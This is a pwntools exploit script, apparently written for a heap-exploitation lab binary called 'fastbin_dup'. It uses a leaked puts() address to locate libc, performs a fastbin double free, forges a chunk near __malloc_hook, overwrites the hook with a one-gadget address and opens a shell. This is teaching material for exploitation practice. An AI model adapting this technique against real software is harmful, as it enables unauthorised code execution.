#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
username = p64(0) + p64(0x31)
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b"A"*0x68)
chunk_B = malloc(0x68, b"B"*0x68)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

fake_fast_bin = 0x7ffff7dd0b2d
chunk_C = malloc(0x68, p64(fake_fast_bin))
chunk_D = malloc(0x68, b"B"*0x68)
chunk_E = malloc(0x68, b"/bin/sh\0")
chunk_F = malloc(0x68, b"Y"*(libc.sym.__malloc_hook - (fake_fast_bin+16)) + p64(libc.address + 0xe1fa1)) # one gadget
malloc(1, b'')
# chunk_F = malloc(0x68, b"Y"*(libc.sym.__malloc_hook - (fake_fast_bin+16)) + p64(libc.sym.system))
# free(chunk_E)
# command = next(libc.search(b"/bin/sh")) # two options
# malloc(command, b'')
# malloc(p64(0x603010), b'')

# =============================================================================

io.interactive()
